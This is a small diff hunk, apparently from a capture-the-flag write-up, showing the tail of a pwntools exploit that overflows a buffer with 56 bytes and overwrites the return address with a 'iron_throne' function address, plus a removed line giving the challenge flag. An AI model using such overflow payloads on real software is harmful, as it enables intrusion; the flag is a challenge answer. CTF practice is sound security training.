@@ -49,4 +49,3 @@ content: |
   p.sendline("A"*56+p32(elf.symbols["iron_throne"])+p32(0xdeadbeef)+p32(0xdeadbeef))
   p.interactive()
   ```
-  **Flag** = inctfj{t4rga3ry4n5_4lw4ys_p4ys_th3ir_d3b1s_2refwh2138uh}
